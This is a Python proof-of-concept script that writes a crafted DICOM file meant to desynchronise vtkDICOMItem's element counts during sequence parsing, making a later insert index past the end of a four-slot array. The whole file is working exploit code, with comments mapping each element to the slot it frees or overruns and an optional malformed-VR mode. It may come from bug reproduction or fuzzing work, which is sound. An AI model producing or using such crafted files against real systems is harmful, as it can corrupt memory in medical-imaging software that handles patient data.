#!/usr/bin/env python3
"""Generate a crafted explicit-VR-LE DICOM dataset driving the vtkDICOMItem
live-count/storage-count desync through a real sequence item parse.

Usage: python3 make-desync-dcm.py OUT.dcm [extra_tail_elements]
The invariant element order is: four ascending US values, interior delete via
an empty SQ at the third tag, reinsert, second delete, two more inserts, then
the insert that indexes DataElements[5] of the 4-slot array.
"""
import struct
import sys


def elem(group, element, vr, value=b""):
    head = struct.pack("<HH", group, element) + vr.encode("ascii")
    if vr in ("OB", "OW", "SQ", "UN", "UT"):
        return head + b"\x00\x00" + struct.pack("<I", len(value)) + value
    return head + struct.pack("<H", len(value)) + value


MODE = "undef"
GROUP = 0x0008


def empty_sq(group, element):
    if MODE == "badvr":
        # Unrecognized explicit VR on a private tag: no dictionary VR and
        # ReadElementValue leaves the vtkDICOMValue unset (invalid).
        return (struct.pack("<HH", group, element) + b"ZZ\x00\x00" +
                b"\x00\x00\x00\x00")
    # Undefined length, immediately delimited.
    return (struct.pack("<HH", group, element) + b"SQ\x00\x00" +
            b"\xff\xff\xff\xff" + struct.pack("<HHI", 0xFFFE, 0xE0DD, 0))


def us(group, element, value):
    return elem(group, element, "US", struct.pack("<H", value))


def item(payload):
    return struct.pack("<HHI", 0xFFFE, 0xE000, len(payload)) + payload


def build(tail=0):
    g = GROUP
    payload = b"".join(us(g, i, 0x100 + i) for i in range(1, 5))
    payload += empty_sq(g, 3)               # delete interior slot 2
    payload += us(g, 5, 0x105)              # reuses slot 3
    payload += empty_sq(g, 5)               # free slot 3
    payload += us(g, 6, 0x106)              # slot 3, live count 4
    payload += us(g, 7, 0x107)              # free slot 2, live count 5
    payload += us(g, 8, 0x108)              # indexes DataElements[5] (OOB)
    for i in range(tail):
        payload += us(g, 9 + i, 0x200 + i)
    seq = elem(0x0008, 0x1110, "SQ", item(payload))
    return b"\x00" * 128 + b"DICM" + seq


if __name__ == "__main__":
    if len(sys.argv) > 3:
        MODE = sys.argv[3]
        if MODE == "badvr":
            GROUP = 0x0009
    with open(sys.argv[1], "wb") as f:
        f.write(build(int(sys.argv[2]) if len(sys.argv) > 2 else 0))
